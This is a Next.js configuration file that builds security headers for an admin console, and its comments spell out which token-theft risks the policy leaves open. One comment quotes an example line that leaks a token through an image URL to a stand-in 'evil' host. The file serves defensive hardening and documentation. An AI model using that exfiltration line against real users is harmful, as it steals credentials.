import type { NextConfig } from "next";

const DEFAULT_API_BASE_URL = "http://localhost:3001/api";

/**
 * Origins parsed out of CSP_CONNECT_SRC_EXTRA (space-separated URLs). Junk
 * tokens are dropped rather than emitted as a directive the browser would
 * reject.
 */
export function extraConnectOrigins(extra: string | undefined): string[] {
  const origins: string[] = [];
  for (const token of (extra ?? "").split(/\s+/)) {
    if (!token) continue;
    try {
      origins.push(new URL(token).origin);
    } catch {
      // Not a URL: ignore.
    }
  }
  return origins;
}

/**
 * Everything the browser is allowed to open an HTTP/WebSocket connection to.
 *
 * The admin PUTs files straight to MinIO (book PDFs, Edit Movie > Replace
 * video, and bulk uploads when NEXT_PUBLIC_USE_DIRECT_MINIO_UPLOAD=true) at
 * the backend's MINIO_PUBLIC_ENDPOINT, which is a different origin from the
 * API and one this build cannot discover on its own. So the strict allow-list
 * ('self' + API + MinIO) only applies once CSP_CONNECT_SRC_EXTRA names that
 * origin; without it, connect-src stays open to any http/https origin so no
 * upload is ever blocked by a header the operator did not configure.
 */
function connectOrigins(
  apiBaseUrl: string | undefined,
  extra: string | undefined,
): string[] {
  let api: URL;
  try {
    api = new URL(apiBaseUrl || DEFAULT_API_BASE_URL);
  } catch {
    api = new URL(DEFAULT_API_BASE_URL);
  }
  const ws = new URL(api.origin);
  ws.protocol = api.protocol === "https:" ? "wss:" : "ws:";
  const extras = extraConnectOrigins(extra);
  if (extras.length === 0)
    return ["'self'", api.origin, ws.origin, "http:", "https:"];
  return ["'self'", api.origin, ws.origin, ...extras];
}

/**
 * Printed by `next build` when the production CSP is left open (see
 * connectOrigins). It is the one place the operator learns what to set, so
 * it names the variable, the value and where it goes.
 */
export const OPEN_CONNECT_SRC_WARNING = [
  "[admin] SECURITY: CSP_CONNECT_SRC_EXTRA is not set, so this build's Content-Security-Policy",
  "connect-src stays open to ANY http/https origin. Uploads work, but a script injected into the",
  "admin could still send a staff token to another host (audit M-31 is hardened, not closed).",
  "To lock it down: in admin/.env set CSP_CONNECT_SRC_EXTRA to the origin of the backend's",
  "MINIO_PUBLIC_ENDPOINT (e.g. CSP_CONNECT_SRC_EXTRA=http://localhost:8443), then rebuild",
  "the admin image (docker compose passes it as a build arg; see admin/.env.example).",
].join("\n");

export interface SecurityHeaderOptions {
  /** NEXT_PUBLIC_API_BASE_URL at build time — the one cross-origin host the admin talks to. */
  apiBaseUrl: string | undefined;
  /** `next dev` needs eval (source maps, React Refresh) and its HMR socket. */
  isDev: boolean;
  /**
   * CSP_CONNECT_SRC_EXTRA at build time: space-separated extra origins for
   * connect-src — the backend's MINIO_PUBLIC_ENDPOINT origin, which the
   * browser PUTs uploads to directly. Unset = connect-src is not locked down
   * (see connectOrigins).
   */
  extraConnectSrc?: string;
}

/**
 * Security headers for every admin response (audit M-31, 2026-10-06).
 *
 * The admin is a money-handling console, so this is the browser-side layer
 * between a future XSS and a full staff takeover. What it closes: the page
 * cannot be framed for clickjacking (frame-ancestors / X-Frame-Options),
 * nothing is sniffed into a script (nosniff), the framework is not
 * advertised, and — once CSP_CONNECT_SRC_EXTRA names the MinIO origin — a
 * script on this origin cannot fetch/XHR/WebSocket the stored tokens to any
 * host but the admin, the API and MinIO (connect-src).
 *
 * What it does NOT close, so M-31 is reduced rather than finished:
 * - img-src allows any http/https host (posters and covers are served by the
 *   cache server on whatever host the API re-hosts them to at request time,
 *   which the build cannot know), so an injected script could still leak a
 *   token in an image URL (`new Image().src = "http://evil/?t=" + token`) or
 *   by navigating the page; CSP never restricts navigation.
 * - script-src keeps 'unsafe-inline': Next's hydration payload and
 *   next-themes are inline scripts; a nonce would need middleware and turn
 *   every prerendered page dynamic, which is a bigger change than this fix
 *   is for. So the injected script itself is not blocked.
 * - The API still accepts a stolen refresh token from any origin (CORS *,
 *   POST /api/auth/refresh); that is a backend change, not a header.
 * Finishing M-31 means httpOnly-cookie tokens and a CORS allow-list on the
 * backend; until then these headers are hardening, not a closed door.
 *
 * style-src 'unsafe-inline': React/recharts/sonner set inline styles.
 * blob:/data: in img-src are the screenshot and upload previews.
 */
export function buildSecurityHeaders({
  apiBaseUrl,
  isDev,
  extraConnectSrc,
}: SecurityHeaderOptions): { key: string; value: string }[] {
  const scriptSrc = ["'self'", "'unsafe-inline'"];
  if (isDev) scriptSrc.push("'unsafe-eval'");
  const connectSrc = connectOrigins(apiBaseUrl, extraConnectSrc);
  if (isDev) connectSrc.push("ws:", "wss:");

  const csp = [
    ["default-src", "'self'"],
    ["script-src", ...scriptSrc],
    ["style-src", "'self'", "'unsafe-inline'"],
    ["img-src", "'self'", "data:", "blob:", "http:", "https:"],
    ["font-src", "'self'", "data:"],
    ["connect-src", ...connectSrc],
    ["media-src", "'self'", "blob:"],
    ["worker-src", "'self'", "blob:"],
    ["object-src", "'none'"],
    ["base-uri", "'self'"],
    ["form-action", "'self'"],
    ["frame-ancestors", "'none'"],
  ]
    .map((directive) => directive.join(" "))
    .join("; ");

  return [
    { key: "Content-Security-Policy", value: csp },
    { key: "X-Frame-Options", value: "DENY" },
    { key: "X-Content-Type-Options", value: "nosniff" },
    { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
    {
      key: "Permissions-Policy",
      value: "camera=(), microphone=(), geolocation=(), payment=()",
    },
  ];
}

const nextConfig: NextConfig = {
  // Produces a minimal, self-contained server bundle (.next/standalone) with
  // only the node_modules actually used traced in — what the Dockerfile
  // copies into the final image instead of the whole node_modules tree.
  output: "standalone",
  // No "X-Powered-By: Next.js" framework fingerprint.
  poweredByHeader: false,
  async headers() {
    const isDev = process.env.NODE_ENV !== "production";
    const extraConnectSrc = process.env.CSP_CONNECT_SRC_EXTRA;
    if (!isDev && extraConnectOrigins(extraConnectSrc).length === 0) {
      console.warn(OPEN_CONNECT_SRC_WARNING);
    }
    return [
      {
        source: "/:path*",
        headers: buildSecurityHeaders({
          apiBaseUrl: process.env.NEXT_PUBLIC_API_BASE_URL,
          isDev,
          extraConnectSrc,
        }),
      },
    ];
  },
  images: {
    // Next's server-side image optimizer runs inside this container, where
    // "localhost:8080" means the container itself, not the cache server —
    // there's no single hostname that's correct for both the optimizer's
    // internal fetch and the browser's public fetch. Skipping optimization
    // means the browser fetches these URLs directly instead, which already
    // works correctly.
    //
    // Because the optimizer never runs, there are no remotePatterns /
    // dangerouslyAllowLocalIP here — they were never consulted. What the
    // browser may load is governed by the CSP img-src above.
    unoptimized: true,
  },
};

export default nextConfig;
